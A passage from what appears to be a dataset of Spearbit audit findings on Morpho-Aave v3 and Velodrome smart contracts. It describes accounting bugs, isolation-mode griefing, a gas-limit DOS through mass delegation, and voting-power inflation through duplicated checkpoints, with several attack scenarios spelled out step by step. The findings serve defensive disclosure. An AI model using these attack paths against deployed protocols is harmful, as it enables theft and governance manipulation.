scaledP2PAmount by the matched amount. [1] However, the scaledP2PAmount update is delayed until the end of the repay function. The following repayFee call then reads the un-updated market.deltas.borrow.scaledP2PAmount storage variable leading to a larger estimation of the P2P fees that can be repaid. The excess fee that is repaid will stay in the contract and not be accounted for, when it should have been used to promote borrowers, increase idle supply or demote suppliers. For example, there could now be P2P suppliers that should have been demoted but are not and in reality don't have any P2P counterparty, leaving the entire accounting system in a broken state.  Example (all values are in underlying amounts for brevity.) Imagine a borrow delta of 1000, borrow.scaledP2PTotal = 10,000 supply.scaledP2PTotal = 8,000, so the repayable fee should be (10,000 - 1000) - (8,000 - 0) = 1,000. Now a P2P borrower wants to repay 3000 debt: 1. Pool repay: no pool repay as they have no pool borrow balance. 2. Decrease p2p borrow delta: decreaseDelta is called which sets market.deltas.borrow.scaledDelta = 0 (but does not update market.deltas.borrow.scaledP2PAmount yet!) and returns matchedBorrowDelta = 1000 3. repayFee is called and it computes (10,000 - 0) - (8,000 - 1,000) = 2,000. They repay more than the actual fee.", "labels": ["Spearbit", "Morpho-Av3", "Severity: High Risk"]}, {"title": "Repaying with ETH does not refund excess", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "Users can repay WETH Morpho positions with ETH using the WETHGateway. The specified repay amount will be wrapped to WETH before calling the Morpho function to repay the WETH debt. However, the Morpho repay function only pulls in Math.min(_getUserBorrowBalanceFromIndexes(underlying, onBehalf, indexes), amount). If the user specified an amount larger than their debt balance, the excess will be stuck in the WETHGateway contract. This might be especially confusing for users because the standard Morpho.repay function does not have this issue and they might be used to specifying a large, round value to be sure to repay all principal and accrued debt once the transaction is mined.", "labels": ["Spearbit", "Morpho-Av3", "Severity: High Risk"]}, {"title": "Morpho can end up in isolation mode", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "Aave-v3 introduced isolation assets and isolation mode for users: \"Borrowers supplying an isolated asset as collateral cannot supply other assets as collateral (though they can still supply to capture yield). Only stablecoins that have been permitted by Aave governance to be borrowable in isolation the mode can be borrowed by users utilizing isolated collateral up to a specified debt ceiling.\" The Morpho contract has a single Aave position for all its users and does therefore not want to end up in isolation mode due to its restrictions. The Morpho code would still treat the supplied non-isolation assets as collateral for their Morpho users, allowing them to borrow against them, but the Aave position does not treat them as collateral anymore. Furthermore, Morpho can only borrow stablecoins up to a certain debt ceiling. Morpho can be brought into isolation mode:  Up to deployment, an attacker maliciously sends an isolated asset to the address of the proxy. Aave sets assets as collateral when transferred, such that the Morpho contract already starts out in isolation mode. This can even happen before deployment by precomputing addresses or simply frontrunning the deployment. This attack also works if Morpho does not intend to create a market for the isolated asset.  Upon deployment and market creation: An attacker or unknowing user is the first to supply an asset and this asset is an isolated asset, Morpho's Aave position automatically enters isolation mode.  At any time if an isolated asset is the only collateral asset. This can happen when collateral assets are turned off on Aave, for example, by withdrawing (or liquidating) the entire balance.", "labels": ["Spearbit", "Morpho-Av3", "Severity: High Risk"]}, {"title": "Collateral setters for Morpho / Aave can end up in a deadlock", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "One can end up in a deadlock where changing the Aave pool or Morpho collateral state is not possible anymore because it can happen that Aave automatically turns the collateral asset off (for example, when withdrawing everything / getting liquidated). Imagine a collateral asset is turned on for both protocols: setAssetIsCollateralOnPool(true) setAssetIsCollateral(true) Then, a user withdraws everything on Morpho / Aave, and Aave automatically turns it off. It's off on Aave but on on Morpho. It can't be turned on for Aave anymore because: if (market.isCollateral) revert Errors.AssetIsCollateralOnMorpho(); But it also can't be turned off on Morpho anymore because of: if (!_pool.getUserConfiguration(address(this)).isUsingAsCollateral(_pool.getReserveData(underlying).id) ) { revert Errors.AssetNotCollateralOnPool(); ,! ,! } c This will be bad if new users deposit after having withdrawn the entire asset. The asset is collateral on Morpho but not on Aave, breaking an important invariant that could lead to liquidating the Morpho Aave position.", "labels": ["Spearbit", "Morpho-Av3", "Severity: Medium Risk"]}, {"title": "First reward claim is zero for newly listed reward tokens", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "When Aave adds a new reward token for an asset, the reward index for this (asset, reward) pair starts at 0. When an update in Morpho's reward manager occurs, it initializes all rewards for the asset and would initialize this new reward token with a startingIndex of 0. 1. Time passes and emissions accumulate to all pool users, resulting in a new index assetIndex. Users who deposited on the pool through Morpho before this reward token was listed should receive their fair share of the entire emission rewards (assetIndex - 0) * oldBalance but they currently receive zero because getRewards returns early if the user's computed index is 0. 2. Also note that the external getUserAssetIndex(address user, address asset, address reward) can be inaccurate because it doesn't simulate setting the startingIndex for reward tokens that haven't been set yet. 3. A smaller issue that can happen when new reward tokens are added is that updates to the startingIndex are late, the startingIndex isn't initialized to 0 but to some asset index that accrued emissions for some time. Morpho on-pool users would lose some rewards until the first update to the asset. (They should accrue from index 0 but accrue from startingIndex.) Given frequent calls to the RewardManager that initializes all rewards for an asset, this difference should be negligible.", "labels": ["Spearbit", "Morpho-Av3", "Severity: Medium Risk"]}, {"title": "Disable creating markets for siloed assets", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "Aave-v3 introduced siloed-borrow assets and siloed-borrow mode for users \"This feature allow assets with potentially manipulatable oracles (for example illiquid Uni V3 pairs) to be listed on Aave as single borrow asset i.e. if user borrows siloed asset, they cannot borrow any other asset. This helps mitigating the risk associated with such assets from impacting the overall solvency of the protocol.\" - Aave Docs The Morpho contract should not be in siloed-borrowing mode to avoid its restrictions on borrowing any other listed assets, especially as borrowing on the pool might be required for withdrawals. If a market for the siloed asset is created at deployment, users might borrow the siloed asset and break borrowing any of the other assets.", "labels": ["Spearbit", "Morpho-Av3", "Severity: Medium Risk"]}, {"title": "A high value of _defaultIterations could make the withdrawal and repay operations revert because of OOG", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "When the user executes some actions, he/she can specify their own maxIterations parameter. The user maxIterations parameter is directly used in supplyLogic and borrowLogic. In the withdrawLogic Morpho is recalculating the maxIterations to be used internally as Math.max(_default- Iterations.withdraw, maxIterations) and in repayLogic is directly using _defaultIterations.repay as the max number of iterations. This parameter is used as the maximum number of iterations that the matching engine can do to match suppli- ers/borrowers during promotion/demotion operations. 15 function _promoteOrDemote( LogarithmicBuckets.Buckets storage poolBuckets, LogarithmicBuckets.Buckets storage p2pBuckets, Types.MatchingEngineVars memory vars ) internal returns (uint256 processed, uint256 iterationsDone) { if (vars.maxIterations == 0) return (0, 0); uint256 remaining = vars.amount; // matching engine code... for (; iterationsDone < vars.maxIterations && remaining != 0; ++iterationsDone) { // matching engine code (onPool, inP2P, remaining) = vars.step(...); // matching engine code... } // matching engine code... } As you can see, the iteration keeps going on until the matching engine has matched enough balance or the iterations have reached the maximum number of iterations. If the matching engine cannot match enough balance, it could revert because of OOG if vars.maxIterations is a high value. For the supply or borrow operations, the user is responsible for the specified number of iterations that might be done during the matching process, in that case, if the operations revert because of OGG, it's not an issue per se. The problem arises for withdraw and replay operations where Morpho is forcing the number of operations and could make all those transactions always revert in case the matching engine does not match enough balance in time. Keep in mind that even if the transaction does not revert during the _promoteOrDemote logic, it could revert during the following operations just because the _promoteOrDemote has consumed enough gas to make the following operations to use the remaining gas.", "labels": ["Spearbit", "Morpho-Av3", "Severity: Medium Risk"]}, {"title": "Morpho should check that the _positionsManager used has the same _E_MODE_CATEGORY_ID and _- ADDRESSES_PROVIDER values used by the Morpho contract itself", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "Because _E_MODE_CATEGORY_ID and _ADDRESSES_PROVIDER are immutable variables and because Morpho is calling the PositionsManager in a delegatecall context, it's fundamental that both Morpho and Posi- tionsManager have been initialized with the same _E_MODE_CATEGORY_ID and _ADDRESSES_PROVIDER values. Morpho should also check the value of the PositionsManager._E_MODE_CATEGORY_ID and PositionsManager._- ADDRESSES_PROVIDER in both the setPositionsManager and initialize function.", "labels": ["Spearbit", "Morpho-Av3", "Severity: Medium Risk"]}, {"title": "In _authorizeLiquidate, when healthFactor is equal to Constants.DEFAULT_LIQUIDATION_THRESHOLD Morpho is wrongly setting close factor to DEFAULT_CLOSE_FACTOR", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "When the borrower's healthFactor is equal to Constants.MIN_LIQUIDATION_THRESHOLD Morpho is returning the wrong value for the closeFactor allowing only liquidate 50% of the collateral instead of the whole amount. When the healthFactor is lower or equal to the Constants.MIN_LIQUIDATION_THRESHOLD Morpho should return Constants.MAX_CLOSE_FACTOR following the same logic applied by Aave. Note that the user cannot be liquidated even if healthFactor == MIN_LIQUIDATION_THRESHOLD if the priceOr- acleSentinel is set and IPriceOracleSentinel(params.priceOracleSentinel).isLiquidationAllowed() == false. See how Aave performs the check inside validateLiquidationCall.", "labels": ["Spearbit", "Morpho-Av3", "Severity: Medium Risk"]}, {"title": "_authorizeBorrow does not check if the Aave price oracle sentinel allows the borrowing operation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "Inside the Aave validation logic for the borrow operation, there's an additional check that prevents the user from performing the operation if it has been not allowed inside the priceOracleSentinel require( params.priceOracleSentinel == address(0) || IPriceOracleSentinel(params.priceOracleSentinel).isBorrowAllowed(), Errors.PRICE_ORACLE_SENTINEL_CHECK_FAILED ); 17 Morpho should implement the same check. If for any reason the borrow operation has been disabled on Aave, it should also be disabled on Morpho itself. While the transaction would fail in case Morpho's user would need to perform the borrow on the pool, there could be cases where the user is completely matched in P2P. In those cases, the user would have performed a borrow even if the borrow operation was not allowed on the underlying Aave pool.", "labels": ["Spearbit", "Morpho-Av3", "Severity: Medium Risk"]}, {"title": "_updateInDS does not \"bubble up\" the updated values of onPool and inP2P", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "The _updateInDS function takes as input uint256 onPool and uint256 inP2P that are passed not as reference, but as pure values. function _updateInDS( address poolToken, address user, LogarithmicBuckets.Buckets storage poolBuckets, LogarithmicBuckets.Buckets storage p2pBuckets, uint256 onPool, uint256 inP2P, bool demoting ) internal { if (onPool <= Constants.DUST_THRESHOLD) onPool = 0; if (inP2P <= Constants.DUST_THRESHOLD) inP2P = 0; // ... other logic of the function } Those values, if lower or equal to Constants.DUST_THRESHOLD will be set to 0. The issue is that the updated version of onPool and inP2P is never bubbled up to the original caller that will later use those values that could have been changed by the _updateInDS logic. For example, the _updateBorrowerInDS function call _updateInDS and relies on the value of onPool and inP2P to understand if the user should be removed or added to the list of borrowers. function _updateBorrowerInDS(address underlying, address user, uint256 onPool, uint256 inP2P, bool ,! demoting) internal { _updateInDS( _market[underlying].variableDebtToken, user, _marketBalances[underlying].poolBorrowers, _marketBalances[underlying].p2pBorrowers, onPool, inP2P, demoting ); if (onPool == 0 && inP2P == 0) _userBorrows[user].remove(underlying); else _userBorrows[user].add(underlying); } 18 Let's assume that inP2P and onPool passed as _updateBorrowerInDS inputs were equal to 1 (the value of DUST_- THRESHOLD). In this case, _updateInDS would update those values to zero because 1 <= DUST_THRESHOLD and would remove the user from both the poolBucket and p2pBuckets of the underlying. When then the function returns in the _updateBorrowerInDS context, the same user would not remove the under- lying from his/her _userBorrows list of assets because the updated values of onPool and inP2P have not been bubbled up by the _updateInDS function. The same conclusion could be made for all the \"root\" level codes that rely on the onPool and inP2P values that could not have been updated with the new 0 value set by _updateInDS.", "labels": ["Spearbit", "Morpho-Av3", "Severity: Low Risk"]}, {"title": "There is no guarantee that the _rewardsManager is set when calling claimRewards", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "Since the _rewardsManager address is set using a setter function in Morpho only and not in the MorphoStorage.sol constructor there is no guarantee that the _rewardsManager is not the default address(0) value. This could cause failures when calling claimRewards if Morpho forgets to set the _rewardsManager.", "labels": ["Spearbit", "Morpho-Av3", "Severity: Low Risk"]}, {"title": "Its Impossible to set _isClaimRewardsPaused", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "The claimRewards function checks the isClaimRewardsPaused boolean value and reverts if it is true. Currently, there is no setter function in the code base that sets the _isClaimRewardsPaused boolean so it is impossible to change.", "labels": ["Spearbit", "Morpho-Av3", "Severity: Low Risk"]}, {"title": "User rewards can be claimed to treasury by DAO", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "When a user claims rewards, the rewards for the entire Morpho contract position on Aave are claimed. The excess rewards remain in the Morpho contract for until all users claimed their rewards. These rewards are not tracked and can be withdrawn by the DAO through a claimToTreasury call.", "labels": ["Spearbit", "Morpho-Av3", "Severity: Low Risk"]}, {"title": "decreaseDelta lib function should return early if amount == 0", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "The passed in amount should be checked for a zero value, and in that condition, return early from the function. The way it currently is unnecessarily consumes more gas, and emits change events that for values that don't end up changing (newScaledDelta). Checking for amount == 0 is already being done in the increaseDelta function.", "labels": ["Spearbit", "Morpho-Av3", "Severity: Gas Optimization"]}, {"title": "Smaller gas optimizations", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "There are several small expressions that can be further gas optimized.", "labels": ["Spearbit", "Morpho-Av3", "Severity: Gas Optimization"]}, {"title": "Gas: Optimize LogarithmicBuckets.getMatch", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "The getMatch function of the logarithmic bucket first checks for a bucket that is the next higher bucket If no higher bucket is found it searches for a bucket that is the than the bucket the provided value would be in. highest bucket that \"is in both bucketsMask and lowerMask.\" However, we already know that any bucket we can now find will be in lowerMask as lowerMask is the mask corresponding to all buckets less than or equal to value's bucket. Instead, we can just directly look for the highest bucket in bucketsMask.", "labels": ["Spearbit", "Morpho-Av3", "Severity: Gas Optimization"]}, {"title": "Consider reverting the supplyCollateralLogic execution when amount.rayDivDown(poolSupplyIndex) is equal to zero", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "In Aave, when an AToken/VariableDebtToken is minted or burned, the transaction will revert if the amount divided by the index is equal to zero. You can see the check in the implementation of _mintScaled and _burnScaled functions in the Aave codebase. Morpho, with PR 688, has decided to prevent supply to the pool in this scenario to avoid a revert of the operation. Before the PR, if the user had supplied an amount for which amount.rayDivDown(poolSupplyIndex) would be equal to zero, the operation would have reverted at the Aave level during the mint operation of the AToken. With the PR, the operation will proceed because the supply to the Aave pool is skipped (see PoolLib.supplyToPool). Allowing this scenario in this specific context for the supplyCollateralLogic function will bring the following side effects:  The supplied user's amount will remain in Morpho's contract and will not be supplied to the Aave pool.  The user's accounting system is not updated because collateralBalance is increased by amount.rayDivDown(poolSupplyIndex) which is equal to zero. 21  If the marketBalances.collateral[onBehalf] was equal to zero (the user has never supplied the underly- ing to Morpho) the underlying token would be wrongly added to the _userCollaterals[onBehalf] storage, even if the amount supplied to Morpho (and to Aave) is equal to zero.  The user will not be able to withdraw the provided amount because the amount has not been accounted for in the storage.  Events.CollateralSupplied event is emitted even if the amount (used as an event parameter) has not been accounted to the user.", "labels": ["Spearbit", "Morpho-Av3", "Severity: Informational"]}, {"title": "WETHGateway does not validate the constructor's input parameters", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "The current implementation of the WETHGateway contracts does not validate the user's parameters during the constructor. In this specific case, the constructor should revert if morpho address is equal to ad- dress(0).", "labels": ["Spearbit", "Morpho-Av3", "Severity: Informational"]}, {"title": "Missing/wrong natspec, typos, minor refactors and renaming of variables to be more meaningful", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "In general, the current codebase does not cover all the functions, events, structs, or state variables with proper natspec. Below you can find a list of small specific improvements regarding typos, missing/wrong natspec, or suggestions to rename variables to a more meaningful/correct name  RewardsManager.sol#L28: consider renaming the balance variable in UserAssetBalance to scaledBalance  PositionsManagerInternal.sol#L289-L297, PositionsManagerInternal.sol#L352-L362: consider better docu- menting this part of the code because at first sight it's not crystal clear why the code is structured in this way. For more context, see the PR comment in the spearbit audit repo linked to it. 22  MorphoInternal.sol#L469-L521: consider moving the _calculateAmountToSeize function from MorphoInt- ernal to PositionsManagerInternal contract. This function is only used internally by the PositionsMan- agerInternal. Note that there could be more instances of these kinds of \"refactoring\" of the code inside other contracts.", "labels": ["Spearbit", "Morpho-Av3", "Severity: Informational"]}, {"title": "No validation checks on the newDefaultIterations struct", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "The initialize function takes in a newDefaultIterations struct and does not perform validation for any of its fields.", "labels": ["Spearbit", "Morpho-Av3", "Severity: Informational"]}, {"title": "No validation check for newPositionsManager address", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "The initialize function does not ensure that the newPositionsManager is not a 0 address.", "labels": ["Spearbit", "Morpho-Av3", "Severity: Informational"]}, {"title": "Missing Natspec function documentation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "The repayLogic function currently has Natspec documentation for every function argument except for the repayer argument.", "labels": ["Spearbit", "Morpho-Av3", "Severity: Informational"]}, {"title": "approveManagerWithSig user experience could be improved", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "With the current implementation of the approveManagerWithSig signers must wait that the previous signers have consumed the nonce to be able to call approveManagerWithSig. Inside the function, there's a specific check that will revert if the signature has been signed with a nonce that is not equal to the current one assigned to the delegator, this means that signatures that use \"future\" nonce will not be able to be approved until previous nonce has been consumed. uint256 usedNonce = _userNonce[signatory]++; if (nonce != usedNonce) revert Errors.InvalidNonce(); Let's make an example: delegator want to allow 2 managers via signature 1) Generate sig_0 for manager1 with nonce_0. 2) Generate sig_1 for manager2 with nonce_1. 3) If no-one executes approveManagerWithSig(sig_0) the sig_1 (and all the signatures based on incremented nonces) cannot be executed. It's true that at some point someone/the signer will execute it.", "labels": ["Spearbit", "Morpho-Av3", "Severity: Informational"]}, {"title": "Missing user markets check when liquidating", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "The liquidation does not check if the user who gets liquidated actually joined the collateral and borrow markets.", "labels": ["Spearbit", "Morpho-Av3", "Severity: Informational"]}, {"title": "Consider reverting instead of returning zero inside repayLogic, withdrawLogic, withdrawCollater- alLogic and liquidateLogic function", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "Position manager always checks the user inputs via different validation functions. One of the vali- dations is that the input's amount must be greater than zero, otherwise, the transaction reverts with revert Er- rors.AmountIsZero(). The same behavior is not followed in those cases where the re-calculated amount is still zero. For example, in repayLogic after re-calculating the max amount that can be repaid by executing amount = Math.min(_getUserBorrowBalanceFromIndexes(underlying, onBehalf, indexes), amount); In this case, Morpho simply executes if (amount == 0) return 0; Note that liquidateLogic should be handled differently because both the borrow amount and/or the collateral amount could be equal to zero. In this case, it would be better to revert with a different custom error based on which of the two amounts are equal to zero.", "labels": ["Spearbit", "Morpho-Av3", "Severity: Informational"]}, {"title": "PERMIT2 operations like transferFrom2 and simplePermit2 will revert if amount is greater than type(uint160).max", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "Both Morpho.sol and PositionsManager.sol uses the Permit2 lib. The current implementation of the permit2 lib explicitly restricts the amount of token to uint160 by calling amount.toUint160() On Morpho, the amount is expressed as a uint256 and the user could, in theory, pass an amount that is greater than type(uint160).max. By doing so, the transaction would revert when it interacts with the permit2 lib.", "labels": ["Spearbit", "Morpho-Av3", "Severity: Informational"]}, {"title": "Both _wrapETH and _unwrapAndTransferETH do not check if the amount is zero", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "Both _wrapETH and _unwrapAndTransferETH are not checking if the amount amount of tokens is greater than zero. If the amount is equal to zero, Morpho should avoid making the external call or simply revert.", "labels": ["Spearbit", "Morpho-Av3", "Severity: Informational"]}, {"title": "Document further contraints on BucketDLL's insert and remove functions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "Besides the constraint that id may not be zero, there are further constraints that are required for the insert and remove functions to work correctly:  insert: \"This function should not be called with an _id that is already in the list.\" Otherwise, it would overwrite the existing _id.  remove: \"This function should not be called with an _id that is not in the list.\" Otherwise, it would set all of _list.accounts[0] to address(0), i.e., mark the list as empty.", "labels": ["Spearbit", "Morpho-Av3", "Severity: Informational"]}, {"title": "Reward calculates earned incorrectly on each epoch boundary", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "Rewards are allocated on a per epoch basis to users in proportion to their total deposited amount. Because the balance and total supply used for rewards is based on _currTs % WEEK + WEEK, the values will not represent the end of the current epoch, but instead the first second of the next epoch. As a result, if a user deposits at any epoch boundary, their deposited amount will actually contribute to the check- pointed total supply of the prior epoch. This leads to a few issues which are detailed below:  Users who deposit in the first second of the next epoch will dilute the total supply for the prior epoch while not being eligible to claim rewards for that same epoch. Consequently, some rewards will be left unclaimed and locked within the contract as the tokenRewardsPerEpoch mapping is used to store reward amounts so unclaimed rewards will not roll over to future epochs.  Users can also avoid zero numEpochs by depositing a negligible amount at an earlier epoch for multiple ac- counts before attempting to deposit a larger amount at _currTs % WEEK == 0. The same user can withdraw their deposit from the VotingEscrow contract with the claimed rewards and re-deposit these funds into an- other account in the same block. They are able to abuse this issue to claim all rewards allocated to each epoch.  In a similar fashion, reward distributions that are weighted by users' votes in the Voter contract can suffer the same issue as outlined above. If the attacker votes some negligible amount on various pools using several accounts, they can increase the vote, claim, reset the vote and re-vote via another account to claim rewards multiple times. The math below shows that _currTs + WEEK is indeed the first second of the next epoch and not the last of the prior epoch. 6 uint256 internal constant WEEK = 7 days; function epochStart(uint256 timestamp) internal pure returns (uint256) { return timestamp - (timestamp % WEEK); } epochStart(123) Type: uint Hex: 0x0 Decimal: 0 epochStart(100000000) Type: uint Hex: 0x5f2b480 Decimal: 99792000 WEEK Type: uint Hex: 0x93a80 Decimal: 604800 epochStart(WEEK) Type: uint Hex: 0x93a80 Decimal: 604800 epochStart(1 + WEEK) Type: uint Hex: 0x93a80 Decimal: 604800 epochStart(0 + WEEK) Type: uint Hex: 0x93a80 Decimal: 604800 epochStart(WEEK - 1) Type: uint Hex: 0x0 Decimal: 0", "labels": ["Spearbit", "Velodrome", "Severity: Critical Risk"]}, {"title": "DOS attack by delegating tokens at MAX_DELEGATES = 1024", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "Any user can delegate the balance of the locked NFT amount to anyone by calling delegate. As the delegated tokens are maintained in an array that's vulnerable to DOS attack, the VotingEscrowhas a safety check of MAX_DELEGATES = 1024 preventing an address from having a huge array. Given the current implementation, any user with 1024 delegated tokens takes approximately 23M gas to transfer/burn/mint a token. However, the current gas limit of the op chain is 15M. (ref: Op-scan)  The current votingEscrow has a limit of MAX_DELEGATES=1024. it's approx 23M to transfer/withdraw a token when there are 1024 delegated voting on a token.  It's cheaper to delegate from an address with a shorter token list to an address with a longer token list. => If someone trying to attack a victim's address by creating a new address, a new lock, and delegating to the victim. By the time the attacker hit the gas limit, the victim can not withdraw/transfer/delegate.", "labels": ["Spearbit", "Velodrome", "Severity: High Risk"]}, {"title": "Inflated voting balance due to duplicated veNFTs within a checkpoint", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "Note: This issue affects VotingEscrow._moveTokenDelegates and VotingEscrow._moveAllDele- gates functions A checkpoint can contain duplicated veNFTs (tokenIDs) under certain circumstances leading to double counting of voting balance. Malicious users could exploit this vulnerability to inflate the voting balance of their accounts and participate in governance and gauge weight voting, potentially causing loss of assets or rewards for other users if the inflated voting balance is used in a malicious manner (e.g. redirect rewards to gauges where attackers have a vested interest). Following is the high-level pseudo-code of the existing _moveTokenDelegates function, which is crucial for under- standing the issue. 1. Assuming moving tokenID=888 from Alice to Bob. 2. Source Code Logic (Moving tokenID=888 out of Alice)  Fetch the existing Alice's token IDs and assign them to srcRepOld  Create a new empty array = srcRepNew  Copy all the token IDs in srcRepOld to srcRepNew except for tokenID=888 3. Destination Code Logic (Moving tokenID=888 into Bob)  Fetch the existing Bobs' token IDs and assign them to dstRepOld  Create a new empty array = dstRepNew  Copy all the token IDs in dstRepOld to dstRepNew  Copy tokenID=888 to dstRepNew The existing logic works fine as long as a new empty array (srcRepNew OR dstRepNew) is created every single time. The code relies on the _findWhatCheckpointToWrite function to return the index of a new checkpoint. function _moveTokenDelegates( ..SNIP.. uint32 nextSrcRepNum = _findWhatCheckpointToWrite(srcRep); uint256[] storage srcRepNew = _checkpoints[srcRep][nextSrcRepNum].tokenIds; However, the problem is that the _findWhatCheckpointToWrite function does not always return the index of a new checkpoint (Refer to Line 1357 below). It will return the last checkpoint if it has already been written once within the same block. function _findWhatCheckpointToWrite(address account) internal view returns (uint32) { uint256 _blockNumber = block.number; uint32 _nCheckPoints = numCheckpoints[account]; if (_nCheckPoints > 0 && _checkpoints[account][_nCheckPoints - 1].fromBlock == _blockNumber) { return _nCheckPoints - 1; } else { return _nCheckPoints; } } If someone triggers the _moveTokenDelegates more than once within the same block (e.g. perform NFT transfer twice to the same person), the _findWhatCheckpointToWrite function will return a new checkpoint in the first transfer but will return the last/previous checkpoint in the second transfer. This will cause the move token delegate logic to be off during the second transfer. 9 First Transfer at Block 1000 Assume the following states: numCheckpoints[Alice] = 1 _checkpoints[Alice][0].tokenIds = [n1, n2] <== Most recent checkpoint numCheckpoints[Bob] = 1 _checkpoints[Bob][0].tokenIds = [n3] <== Most recent checkpoint To move tokenID=2 from Alice to Bob, the _moveTokenDelegates(Alice, Bob, n2) function will be triggered. The _findWhatCheckpointToWrite will return the index of 1 which points to a new array. The end states of the first transfer will be as follows: numCheckpoints[Alice] = 2 _checkpoints[Alice][0].tokenIds = [n1, n2] _checkpoints[Alice][1].tokenIds = [n1] <== Most recent checkpoint numCheckpoints[Bob] = 2 _checkpoints[Bob][0].tokenIds = [n3] _checkpoints[Bob][1].tokenIds = [n2, n3] <== Most recent checkpoint Everything is working fine at this point in time. Second Transfer at Block 1000 (same block) To move tokenID=1 from Alice to Bob, the _moveTokenDelegates(Alice, Bob, n1) function will be triggered. This time round since the last checkpoint block is the same as the current block, the _findWhatCheckpointToWrite function will return the last checkpoint instead of a new checkpoint. The srcRepNew and dstRepNew will end up referencing the old checkpoint instead of a new checkpoint. As such, the srcRepNew and dstRepNew array will reference back to the old checkpoint _checkpoints[Alice][1].tokenIds and _checkpoints[Bob][1].tokenIds respectively. The end state of the second transfer will be as follows: numCheckpoints[Alice] = 3 _checkpoints[Alice][0].tokenIds = [n1, n2] _checkpoints[Alice][1].tokenIds = [n1] <== Most recent checkpoint numCheckpoints[Bob] = 3 _checkpoints[Bob][0].tokenIds = [n3] _checkpoints[Bob][1].tokenIds = [n2, n3, n2, n3, n1] <== Most recent checkpoint Four (4) problems could be observed from the end state: 1. The numCheckpoints is incorrect. Should be two (2) instead to three (3) 2. TokenID=1 has been added to Bob's Checkpoint, but it has not been removed from Alice's Checkpoint 3. Bob's Checkpoint contains duplicated tokenIDs (e.g. there are two TokenID=2 and TokenID=3) 4. TokenID is not unique (e.g. TokenID appears more than once) Since the token IDs within the checkpoint will be used to determine the voting power, the voting power will be inflated in this case as there will be a double count of certain NFTs. function _moveTokenDelegates( ..SNIP.. uint32 nextSrcRepNum = _findWhatCheckpointToWrite(srcRep); uint256[] storage srcRepNew = _checkpoints[srcRep][nextSrcRepNum].tokenIds; 10 Additional Comment about nextSrcRepNum variable and _findWhatCheckpointToWrite function In Line 1320 below, the code wrongly assumes that the _findWhatCheckpointToWrite function will always return the index of the next new checkpoint. The _findWhatCheckpointToWrite function will return the index of the latest checkpoint instead of a new one if block.number == checkpoint.fromBlock. function _moveTokenDelegates( address srcRep, address dstRep, uint256 _tokenId ) internal { if (srcRep != dstRep && _tokenId > 0) { if (srcRep != address(0)) { uint32 srcRepNum = numCheckpoints[srcRep]; uint256[] storage srcRepOld = srcRepNum > 0 ? _checkpoints[srcRep][srcRepNum - 1].tokenIds : _checkpoints[srcRep][0].tokenIds; uint32 nextSrcRepNum = _findWhatCheckpointToWrite(srcRep); uint256[] storage srcRepNew = _checkpoints[srcRep][nextSrcRepNum].tokenIds; Additional Comment about numCheckpoints In Line 1330 below, the function computes the new number of checkpoints by incrementing the srcRepNum by one. However, this is incorrect because if block.number == checkpoint.fromBlock, then the number of checkpoints remains the same and does not increment. function _moveTokenDelegates( address srcRep, address dstRep, uint256 _tokenId ) internal { if (srcRep != dstRep && _tokenId > 0) { if (srcRep != 